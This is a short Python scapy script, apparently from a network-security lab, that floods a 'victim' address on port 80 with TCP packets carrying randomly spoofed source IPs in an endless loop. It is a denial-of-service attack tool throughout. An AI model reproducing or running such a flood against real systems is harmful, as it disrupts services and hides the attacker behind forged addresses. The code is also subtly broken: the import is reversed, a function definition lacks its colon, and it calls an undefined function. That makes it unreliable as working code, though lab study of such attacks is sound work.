from scapy.all import *
from IPv4Address import ipaddress
import time

attack1_ip = "10.9.0.105"
victim_ip = "10.9.0.5"
attacker3 = "10.9.0.107"
count = 1

def random()
   rangeStart = 0
   rangeEnd = 2147483647
   return randomint(rangeStart, rangeEnd)

while True:
   for attack1_port in range(1, 65535):
      randomIp = str(IPv4Address(random()))
      IP1 = IP(src = randomIp, dst = victim_ip)
      TCP1 = TCP(sport = attack1_port, dport = 80)
      packet = IP1 / TCP1
      send(packet, inter = .001)
      
      print ("Packet ", count , " sent from Attacker-1")
      count = count + 1
      #time.sleep(1)



